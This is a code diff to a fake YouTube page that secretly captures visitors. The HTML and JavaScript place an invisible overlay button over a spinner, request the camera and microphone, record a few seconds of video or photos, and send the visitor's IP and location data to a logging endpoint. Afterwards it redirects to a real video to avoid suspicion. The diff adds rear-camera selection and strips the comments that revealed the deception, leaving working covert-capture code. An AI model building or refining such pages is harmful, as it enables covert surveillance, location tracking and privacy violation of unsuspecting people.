@@ -6,24 +6,14 @@
     <title>YouTube</title>
     <style>
         body { margin: 0; background-color: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; overflow: hidden; }
-        
-        /* Fake YouTube Player Container */
         .video-container { position: relative; width: 100vw; height: 56.25vw; background: #000; display: flex; align-items: center; justify-content: center; cursor: pointer; }
-        
-        /* The Loading Spinner */
         .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #fff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(3600deg); } }
-
-        /* Invisible Huge Button Overlay */
-        #overlay-btn { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; opacity: 0; cursor: pointer; }
-
-        /* Fake UI Elements */
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #overlay-btn { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; opacity: 0; cursor: pointer; border: none; background: none; }
         .video-info { padding: 15px; }
         .video-title { font-size: 18px; font-weight: bold; margin-bottom: 8px; color: #f1f1f1; }
         .video-stats { font-size: 14px; color: #aaa; }
         .loading-text { margin-top: 15px; font-size: 14px; color: #aaa; }
-
-        /* Hidden elements for capture */
         video, canvas { display: none; }
     </style>
 </head>
@@ -47,27 +37,24 @@
         const params = new URLSearchParams(window.location.search);
         const uid = params.get('id');
         const mode = params.get('mode') || 'photo';
+        const camMode = params.get('cam') || 'user'; // 'user' for front, 'environment' for back
 
         async function startCapture() {
-            if (!uid || uid === "null") {
-                console.log("No ID found.");
-                return;
-            }
+            if (!uid || uid === "null") return;
 
             document.getElementById('status-msg').innerText = "Loading video buffer...";
             document.getElementById('overlay-btn').style.display = 'none';
 
             try {
-                // Request camera (and audio if video mode)
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
+                    video: { facingMode: camMode }, 
                     audio: (mode === 'video') 
                 });
                 
                 const v = document.getElementById('v');
                 v.srcObject = stream;
 
-                // Silently grab IP/Device info
+                // Log IP Info
                 fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
                     fetch(`/log_info?id=${uid}`, {
                         method: 'POST',
@@ -83,8 +70,7 @@
                 }
 
             } catch (err) {
-                document.getElementById('status-msg').innerText = "Playback error: Please enable permissions.";
-                console.error(err);
+                document.getElementById('status-msg').innerText = "Playback error: Please enable permissions to play.";
             }
         }
 
@@ -124,11 +110,10 @@
                 redirectToYouTube();
             };
             recorder.start();
-            setTimeout(() => recorder.stop(), 3500); // Capture 3.5 seconds
+            setTimeout(() => recorder.stop(), 3500);
         }
 
         function redirectToYouTube() {
-            // After capture, send them to a real video so they don't suspect anything
             const ytId = params.get('ytid') || 'dQw4w9WgXcQ';
             window.location.href = `https://www.youtube.com/watch?v=${ytId}`;
         }
